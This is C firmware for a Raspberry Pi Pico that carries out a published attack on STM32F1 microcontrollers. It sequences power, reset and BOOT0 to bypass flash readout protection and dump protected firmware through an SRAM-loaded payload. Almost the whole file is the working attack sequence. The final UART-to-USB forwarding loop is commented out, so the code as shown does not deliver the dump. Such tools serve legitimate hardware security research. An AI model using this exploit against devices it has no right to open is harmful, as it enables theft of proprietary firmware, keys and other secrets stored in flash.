/*
 * Copyright (C) 2023 Patrick Pedersen

 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.

 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.

 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.

 * Pi Pico Attack Board Firmware
 * Version: 1.2

 * This attack is based on the works of:
 *  Johannes Obermaier, Marc Schink and Kosma Moczek
 * The relevant paper can be found here, particularly section H3:
 *  https://www.usenix.org/system/files/woot20-paper-obermaier.pdf
 * And the relevant code can be found here:
 *  https://github.com/JohannesObermaier/f103-analysis/tree/master/h3
 *
 */

#include <hardware/uart.h>
#include <hardware/pwm.h>
#include <hardware/watchdog.h>
#include <pico/bootrom.h>
#include <pico/stdlib.h>
#include <stdio.h>
#include <tusb.h>

#include "config.h"
#include "payload.h"

int bmp_loader(const char *data, uint32_t length, uint32_t offset);

// Exact steps for attack:
//  Power pins high
//  Wait for serial input
//  Power pins low
//  Wait for reset to go low <- GPIO INPUT
//  Power pins high
//  Wait for SRAM firmware to run (Approx 15ms)
//  Set boot0 pin and reset pin to low
//  Wait for reset release (Approx 15ms)
//  Set reset to input
//  Forward UART to USB

// Note that there are three power pins. Each pin can source
// about 15 mA, so we gang three together to get a total
// of 45 mA or so. This is a bit low, and drives the target
// at 2.85V. Low, but enough for things to work.

#define LED_PIN PICO_DEFAULT_LED_PIN

static void target_power(bool on)
{
	if (on) {
		// gpio_put(POWER1_PIN, 1);
		// gpio_put(POWER2_PIN, 1);
		// gpio_put(POWER3_PIN, 1);
		gpio_set_mask(1 << POWER1_PIN | 1 << POWER2_PIN | 1 << POWER3_PIN);
	} else {
		// gpio_put(POWER1_PIN, 0);
		// gpio_put(POWER2_PIN, 0);
		// gpio_put(POWER3_PIN, 0);
		gpio_clr_mask(1 << POWER1_PIN | 1 << POWER2_PIN | 1 << POWER3_PIN);
	}
}

static void handle_control(uint32_t timeout_ms)
{
	printf("Target not found... retrying\n");
	int c = getchar_timeout_us(timeout_ms * 1000);
	if (c == PICO_ERROR_TIMEOUT) {
		return;
	}
	switch (c) {
	case 'b':
		printf("Bootloader mode selected\n");
		reset_usb_boot(0, 0);
		sleep_ms(10000);
		break;
	case 'r':
		printf("Restarting Pico\n");
		watchdog_reboot(0, 0, 10);
		sleep_ms(10000);
		break;
	default:
		printf("Usage:\n");
		printf("    b    Reboot into bootloader mode\n");
		printf("    r    Restart Pico\n");
		printf("\n");
		break;
	}
}

int main()
{
	stdio_init_all();
	while (!tud_cdc_connected()) {
	}

	// Init GPIOs
	gpio_init(LED_PIN);
	gpio_init(SWDIO_PIN);
	gpio_init(SWCLK_PIN);
	gpio_init(POWER1_PIN);
	gpio_init(POWER2_PIN);
	gpio_init(POWER3_PIN);
	gpio_init(RESET_PIN);
	gpio_init(BOOT0_PIN);
	gpio_set_dir(LED_PIN, GPIO_OUT);
	gpio_set_dir(SWDIO_PIN, GPIO_OUT);
	gpio_set_dir(SWCLK_PIN, GPIO_OUT);
	gpio_set_dir(RESET_PIN, GPIO_IN);
	gpio_pull_up(RESET_PIN);
	gpio_set_dir(BOOT0_PIN, GPIO_OUT);

	// Init PWM for indicator LED
	gpio_set_function(LED_PIN, GPIO_FUNC_PWM);
	uint slice_num = pwm_gpio_to_slice_num(LED_PIN);
	pwm_set_wrap(slice_num, 255);
	pwm_set_chan_level(slice_num, PWM_CHAN_A, 0);
	pwm_set_enabled(slice_num, true);

	// -- Attack begins here --

	// Set BOOT0 to high and enable power

	/* Boot into SRAM so we can fetch SRAM reset vector address
	 * See https://github.com/CTXz/stm32f1-picopwner/issues/1#issuecomment-1603281043
	 */
	gpio_put(BOOT0_PIN, 1);

	/* Enable power
	 * Ensure that the power pin set high before configuring it as output
	 * to prevent the target from sinking current through the pin if the debug
	 * probe is already attached
	 */
	target_power(1);
	gpio_set_dir(POWER1_PIN, GPIO_OUT);
	gpio_set_dir(POWER2_PIN, GPIO_OUT);
	gpio_set_dir(POWER3_PIN, GPIO_OUT);

	gpio_put(LED_PIN, 0);

	while (!gpio_get(RESET_PIN)) {
		printf("Target is already in RESET! Ensure target is active before continuing.\r\n");
		handle_control(500);
	}

	// -- Ensure that the target exploit firmware has been loaded into the target's SRAM before preceeding --

	while (bmp_loader(payload, sizeof(payload), 0x20000000) != 0) {
		handle_control(500);
	}

	printf("Connected to target\n");
	sleep_ms(1000);

	printf("Found target. Loading exploit...\n");

	// Wait for any serial input to start the attack
	int i = 0;
	while (getchar_timeout_us(500 * 1000) == PICO_ERROR_TIMEOUT) {
		printf("%d: Load firmware via JTAG. Press any key to start the attack...\r\n", i += 1);
		handle_control(500);
	}

	printf("Starting attack...\r\n");

	// Drop the power
	gpio_put(LED_PIN, 1);
	gpio_put(POWER1_PIN, 0);
	gpio_put(POWER2_PIN, 0);
	gpio_put(POWER3_PIN, 0);

	// Wait for reset to go low
	while (gpio_get(RESET_PIN)) {
		tight_loop_contents();
	}

	// Immediately re-enable power
	gpio_put(POWER1_PIN, 1);
	gpio_put(POWER2_PIN, 1);
	gpio_put(POWER3_PIN, 1);

	// Debugger lock is now disabled and we're now
	// booting from SRAM. Wait for the target to run stage 1
	// of the exploit which sets the FPB to jump to stage 2
	// when the PC reaches a reset vector fetch (0x00000004)
	sleep_ms(15);

	// Set BOOT0 to boot from flash. This will trick the target
	// into thinking it's running from flash, which will
	// disable readout protection.
	gpio_put(BOOT0_PIN, 0);

	// Reset the target
	gpio_set_dir(RESET_PIN, GPIO_OUT);
	gpio_put(RESET_PIN, 0);

	// Wait for reset
	sleep_ms(15);

	// Release reset
	// Due to the FPB, the target will now jump to
	// stage 2 of the exploit and dump the contents
	// of the flash over UART
	gpio_set_dir(RESET_PIN, GPIO_IN);
	gpio_pull_up(RESET_PIN);

	printf("Starting UART shell.\r\n");

	// Forward dumped data from UART to USB serial
	uint stalls = 0;
	while (true) {
		handle_control(500);

		// int c;
		// if (uart_is_readable(UART_ID)) {
		// 	c = uart_getc(UART_ID);
		// 	putchar(c);
		// 	pwm_set_gpio_level(LED_PIN, c); // LED will change intensity based on UART data
		// 	stalls = 0;
		// } else {
		// 	// If no data is received for a while, turn off the LED
		// 	if (++stalls == UART_STALLS_FOR_LED_OFF)
		// 		pwm_set_gpio_level(LED_PIN, 0);
		// }

		// c = getchar_timeout_us(0);
		// if (c != PICO_ERROR_TIMEOUT) {
		// 	// putchar(c); // Echo back
		// 	uart_putc_raw(UART_ID, c);
		// }
	}
}
